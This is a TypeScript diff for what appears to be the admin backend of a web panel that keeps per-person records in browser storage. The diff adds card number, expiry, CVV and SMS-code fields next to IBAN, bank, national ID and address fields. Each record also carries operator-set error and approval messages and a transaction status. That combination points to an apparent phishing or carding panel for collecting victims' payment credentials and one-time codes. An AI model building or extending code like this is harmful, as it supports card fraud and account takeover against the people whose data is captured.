@@ -13,7 +13,7 @@ export async function fetchFirebaseUsers(): Promise<{ id: string; email: string 
     }
     // This is a placeholder. In a real-world scenario, you can't get a user list on the client.
     // This requires the Admin SDK on a secure backend.
-    // We will return an empty array to avoid breaking the app, and the admin will manage users they know.
+    // We will simulate this by looking at what the admin might have added manually.
     console.warn("fetchFirebaseUsers is a client-side placeholder. For a real app, use a secure backend with Firebase Admin SDK to list users.");
     
     // Attempt to get from cache first
@@ -30,12 +30,12 @@ export async function fetchFirebaseUsers(): Promise<{ id: string; email: string 
         }
     }
     
-    // In a real app, here you would make a fetch call to your backend API
-    // e.g., const response = await fetch('/api/firebase-users');
-    // const users = await response.json();
-    
-    // For this example, we'll return an empty array, and the logic will primarily rely on existing member data.
-    const users: { id: string; email: string }[] = [];
+    // For this example, we'll extract potential users from the members list itself,
+    // as we can't call the real Admin SDK.
+    const storedMembers = getMembersFromStorageOnly();
+    const users = storedMembers
+      .filter(m => m.id && m.phone)
+      .map(m => ({ id: m.id, email: m.phone }));
     
     try {
         localStorage.setItem(FIREBASE_USERS_CACHE_KEY, JSON.stringify({ timestamp: Date.now(), users }));
@@ -46,6 +46,21 @@ export async function fetchFirebaseUsers(): Promise<{ id: string; email: string 
     return users;
 }
 
+function getMembersFromStorageOnly(): AdminMember[] {
+    if (typeof window === 'undefined') {
+        return [];
+    }
+    const storedDetailsJSON = localStorage.getItem(MEMBER_STORAGE_KEY);
+    if (storedDetailsJSON) {
+        try {
+            return JSON.parse(storedDetailsJSON);
+        } catch (e) {
+            console.error("Failed to parse members from localStorage", e);
+        }
+    }
+    return [];
+}
+
 
 export async function getMembers(): Promise<AdminMember[]> {
     if (typeof window === 'undefined') {
@@ -53,66 +68,34 @@ export async function getMembers(): Promise<AdminMember[]> {
     }
     
     try {
-        const storedDetailsJSON = localStorage.getItem(MEMBER_STORAGE_KEY);
-        let storedMembers: AdminMember[] = [];
-        if (storedDetailsJSON) {
-            try {
-                storedMembers = JSON.parse(storedDetailsJSON);
-            } catch (e) {
-                console.error("Failed to parse members from localStorage", e);
-                storedMembers = [];
-            }
-        }
+        // This function now primarily relies on what's in local storage,
+        // which gets updated when a new user is created via the admin panel.
+        // The concept of "syncing" with Firebase Auth is simulated.
+        const storedMembers = getMembersFromStorageOnly();
 
-        const firebaseUsers = await fetchFirebaseUsers();
-        
-        const allMembersMap = new Map<string, AdminMember>();
-
-        // First, add all existing members with details to the map
-        storedMembers.forEach(member => {
-            allMembersMap.set(member.id, member);
-        });
-
-        // Then, add or update with users from Firebase Auth
-        firebaseUsers.forEach(fbUser => {
-            if (!allMembersMap.has(fbUser.id)) {
-                // This is a new user from Firebase not yet in our details list
-                allMembersMap.set(fbUser.id, {
-                    id: fbUser.id,
-                    phone: fbUser.email,
-                    name: '',
-                    iban: '',
-                    bank: '',
-                    tc: '',
-                    il: '',
-                    ilce: '',
-                    weeklyGain: '',
-                    errorMessage: 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
-                    onayMesaji: 'İşleminiz başarıyla alındı.',
-                    invoiceAmount: '',
-                    accountActivity: '',
-                    meetingInfo: '',
-                    currentBalance: '0 TL',
-                    status: 'Pasif',
-                    transactionStatus: 'allowed',
-                });
-            } else {
-                // User exists, ensure their email (phone field) is up-to-date
-                const existingMember = allMembersMap.get(fbUser.id)!;
-                existingMember.phone = fbUser.email;
-            }
-        });
-
-        // Add default values to all members to prevent errors
-        const allMembersWithDefaults = Array.from(allMembersMap.values()).map(member => ({
-            status: member.status || 'Pasif',
-            transactionStatus: member.transactionStatus || 'allowed',
-            onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
+        // Add default values to all members to prevent errors on the frontend
+        const allMembersWithDefaults = storedMembers.map(member => ({
+            id: member.id || '',
+            phone: member.phone || '', // email is stored in phone field
+            name: member.name || '',
+            iban: member.iban || '',
+            bank: member.bank || '',
+            tc: member.tc || '',
+            il: member.il || '',
+            ilce: member.ilce || '',
+            weeklyGain: member.weeklyGain || '',
             errorMessage: member.errorMessage || 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
+            onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
+            invoiceAmount: member.invoiceAmount || '',
             accountActivity: member.accountActivity || "",
             meetingInfo: member.meetingInfo || "",
             currentBalance: member.currentBalance || "0 TL",
-            ...member,
+            status: member.status || 'Pasif',
+            transactionStatus: member.transactionStatus || 'allowed',
+            cardNumber: member.cardNumber || '',
+            cardExpiry: member.cardExpiry || '',
+            cardCvv: member.cardCvv || '',
+            smsCode: member.smsCode || '',
         }));
         
         return allMembersWithDefaults;
@@ -129,9 +112,12 @@ export function setMembers(members: AdminMember[]): void {
         return;
     }
     try {
-        // Now we store all members, including those that might only have an id and email,
-        // to maintain a consistent list that mirrors Firebase Auth users.
         localStorage.setItem(MEMBER_STORAGE_KEY, JSON.stringify(members));
+        // Update the simulated Firebase cache as well
+        const users = members
+            .filter(m => m.id && m.phone)
+            .map(m => ({ id: m.id, email: m.phone }));
+        localStorage.setItem(FIREBASE_USERS_CACHE_KEY, JSON.stringify({ timestamp: Date.now(), users }));
     } catch (error) {
         console.error("Failed to save members to localStorage", error);
     }
